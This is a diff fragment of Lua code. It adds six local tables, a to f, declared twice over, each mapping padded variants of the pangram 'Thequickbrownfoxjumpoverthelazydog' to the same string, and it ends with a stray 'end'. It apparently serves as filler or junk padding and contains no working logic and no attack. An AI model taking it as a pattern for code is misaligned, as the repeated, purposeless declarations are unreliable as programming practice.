+	local a={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local b={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local c={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local d={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local e={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local f={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local a={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local b={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local c={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local d={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local e={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+	local f={['Thequickbrownfoxjumpoverthelazydog'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydoggg'] = 'Thequickbrownfoxjumpoverthelazydog',['Thequickbrownfoxjumpoverthelazydogggg'] = 'Thequickbrownfoxjumpoverthelazydog'}
+end
